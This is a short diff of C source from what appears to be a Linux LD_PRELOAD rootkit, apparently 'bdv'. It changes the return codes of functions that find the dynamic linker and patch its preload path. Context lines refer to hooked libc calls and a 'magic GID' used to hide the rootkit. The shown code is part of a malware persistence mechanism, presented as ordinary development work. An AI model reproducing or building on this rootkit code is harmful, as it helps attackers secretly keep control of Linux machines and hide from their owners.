@@ -56,9 +56,9 @@ int _ldpatch(const char *path, const char *oldpreload, const char *newpreload){
     fclose(nfp);
 
     if(count != LEN_OLD_PRELOAD){  // oldpreload was not found.
-        hook(CUNLINK);             // remove tmp file & return nothing was done.
+        hook(CUNLINK);             // remove tmp file.
         call(CUNLINK, tmppath);
-        return 0;
+        return -2;  // this is worth noting.
     }
 
     int chr;
@@ -68,10 +68,10 @@ int _ldpatch(const char *path, const char *oldpreload, const char *newpreload){
         else{
             // don't leave behind magic GID after `./bdv uninstall`
             chr = chown_path(path, 0);
-            if(chr != -1)
-                return 1; // success
-            else
+            if(chr < 0)
                 return -1;
+
+            return 1; // success
         }
     }else return -1;
 
@@ -85,7 +85,7 @@ int ldpatch(const char *oldpreload, const char *newpreload){
 
     foundld = ldfind(&allf);
     if(foundld == NULL)
-        return 0;
+        return -3;
 
     for(int i=0; i<allf; i++){
         p=_ldpatch(foundld[i], oldpreload, newpreload);
